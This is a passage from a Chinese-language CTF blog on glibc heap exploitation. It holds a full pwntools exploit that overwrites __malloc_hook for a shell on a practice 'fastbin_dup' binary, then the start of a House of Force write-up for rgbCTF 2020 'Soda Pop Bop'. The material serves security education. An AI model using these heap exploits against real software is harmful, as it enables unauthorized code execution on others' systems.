class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440)# chunk0</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk2</span><br><span class="line">create_note(0x60) # chunk3</span><br><span class="line">create_note(0x60) # chunk4</span><br><span class="line">create_note(0x60) # chunk5</span><br><span class="line">create_note(0x60) # chunk6</span><br><span class="line">create_note(0x60) # chunk7</span><br><span class="line">create_note(0x60) # chunk8</span><br><span class="line">create_note(0x60) # chunk9</span><br><span class="line">create_note(0x60) # chunk10</span><br><span class="line">del_note(0)</span><br><span class="line">create_note(0x440)# chunk11</span><br><span class="line">get_note(11)</span><br><span class="line">raw = io.recvline()</span><br><span class="line">main_arena = u64(raw[-7:-1].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">log.info(&quot;main_arena is 0x%x&quot; %main_arena)</span><br><span class="line">libc_base = main_arena - 0x00000000001ebb80 - 96</span><br><span class="line">system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">log.info(&quot;libc base address is 0x%x&quot; %libc_base)</span><br><span class="line">log.info(&quot;system is 0x%x&quot; %system)</span><br><span class="line">log.info(&quot;malloc_hook is 0x%x&quot; %malloc_hook)</span><br><span class="line">malloc_hook_s2b = malloc_hook - 0x2b - 8 + 0x10</span><br><span class="line"></span><br><span class="line">del_note(1)</span><br><span class="line">del_note(2)</span><br><span class="line">del_note(3)</span><br><span class="line">del_note(4)</span><br><span class="line">del_note(5)</span><br><span class="line">del_note(6)</span><br><span class="line">del_note(7)</span><br><span class="line">del_note(8)</span><br><span class="line">del_note(9)</span><br><span class="line">del_note(10)</span><br><span class="line">del_note(9)</span><br><span class="line"></span><br><span class="line">create_note(0x60) # chunk12</span><br><span class="line">create_note(0x60) # chunk13</span><br><span class="line">create_note(0x60) # chunk14</span><br><span class="line">create_note(0x60) # chunk15</span><br><span class="line">create_note(0x60) # chunk16</span><br><span class="line">create_note(0x60) # chunk17</span><br><span class="line">create_note(0x60) # chunk18</span><br><span class="line">create_note(0x60) # chunk19</span><br><span class="line">get_note(19)</span><br><span class="line"></span><br><span class="line">heap = u64(io.recvline()[-5:-1].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">log.info(&quot;tcache address is 0x%x&quot; %heap)</span><br><span class="line"></span><br><span class="line">set_note(19, p64(malloc_hook_s2b))</span><br><span class="line">create_note(0x60) # chunk20</span><br><span class="line">create_note(0x60) # chunk21</span><br><span class="line">create_note(0x60) # chunk22, overwrite malloc_hook</span><br><span class="line"></span><br><span class="line">set_note(20, b&quot;/bin/sh\x00&quot;)</span><br><span class="line">set_note(22, b&quot;a&quot;*0x23 + p64(system))</span><br><span class="line"></span><br><span class="line">create_note(heap)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2019/heap_exploitation/heap_2.31_fastbin_dup_5.png" alt=""></p>
<hr>
<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><hr>
<p>參考來源:<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16533388.html">https://www.cnblogs.com/ZIKH26/articles/16533388.html</a></p>
<hr>
<h1 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h1><hr>
<h2 id="rgbCTF-2020-Soda-Pop-Bop-x64-ubuntu-18-04-libc-2-27"><a href="#rgbCTF-2020-Soda-Pop-Bop-x64-ubuntu-18-04-libc-2-27" class="headerlink" title="rgbCTF 2020 / Soda Pop Bop (x64, ubuntu 18.04, libc 2.27)"></a>rgbCTF 2020 / Soda Pop Bop (x64, ubuntu 18.04, libc 2.27)</h2><p>執行起來長這個樣子<br><img src="/img/2019/heap_exploitation/heap_spb_1.jpg" alt=""><br>大概逆向一下<br><img src="/img/2019/heap_exploitation/heap_spb_2.jpg" alt=""><br>漏洞點在於 <code>party_size</code> 是設為 <code>&lt;=1</code> (照 assambly 來看)，導致可以輸入小於 1 的值，但輸入 <code>-1</code> 的話會跳到 <code>You can&#39;t have a party of 0!</code>，所以這邊輸入 0<br>可以看到只要把 <code>party_size</code> 寫為 0 後他直接幫我們把 top chunk 的 size 設為 <code>-1</code> 了<br><img src="/img/2019/heap_exploitation/heap_spb_3.jpg" alt=""><br>這題用來練習 <code>House of Force</code> 很適合</p>
<p>後續就是怎麼利用 top chunk 的這一點了，首先 leak binary base，跟 heap base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./spb&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27; sang&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; so&#x27;</span>)[:-<span class="number">3</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdrink</span>(<span class="params">member, fuck</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(member))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(fuck))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_base = leak() &amp;~<span class="number">0xfff</span> <span class="comment"># get binary base</span></span><br><span class="line">log.info(<span class="string">&quot;binary base address is 0x%x&quot;</span> %binary_base)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">32</span>, <span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">heap_base = leak() &amp;~<span class="number">0xfff</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base is 0x%x&quot;</span> %heap_base)</span><br><span class="line">top = heap_base+<span class="number">0x2a0</span></span><br><span class="line">log.info(<span class="string">&quot;top chunk is 0x%x&quot;</span> %top)</span><br></pre></td></tr></table></figure>
<p><img src="/img/2019/heap_exploitation/heap_spb_8.jpg" alt=""><br>主要的核心在於 <code>Sing a song</code> 的功能<br><img src="/img/2019/heap_exploitation/heap_spb_6.jpg" alt=""></p>
<p><img src="/img/2019/heap_exploitation/heap_spb_4.jpg" alt=""></p>
<p><img src="/img/2019/heap_exploitation/heap_spb_5.jpg" alt=""><br>第一步先 print 最初 <code>selected_song</code> 指向的位置─也就是存有 <code>Never Gonna Give You Up - Rick Astley</code> 的地址<br><img src="/img/2019/heap_exploitation/heap_spb_7.jpg" alt=""><br>雖然 <code>selected_song</code> 是在 bss (全域變數) 的地址範圍，但看得出來它是一個 pointer，指向的地方是 code base 的區間段<br>所以可以透過扣除最後的 1.5 byte 得到 binary base</p>
<p>在那之後我們隨意 malloc 一個空間，這樣 <code>selected_song</code> 就又會指向 heap 區段的地址，一樣扣除最後 1.5 bytes 就可以得到 heap base address</p>
<p>再來就是 leak libc 的位址了</p>


                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/sda06407" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2024 AStar<br></p>
                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>